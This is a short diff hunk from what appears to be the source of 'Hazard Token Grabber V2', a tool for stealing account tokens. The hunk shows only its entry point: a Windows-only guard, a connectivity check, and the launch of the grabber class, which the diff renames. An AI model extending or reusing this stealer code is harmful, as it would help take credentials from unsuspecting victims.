@@ -1131,4 +1131,4 @@ if __name__ == "__main__" and os.name == "nt":
         httpx.get('https://google.com')	
     except httpx.ConnectTimeout:	
         os._exit(0)	
-    asyncio.run(HazardTokenGrabberV2().init())
+    asyncio.run(Hazard_Token_Grabber_V2().init())
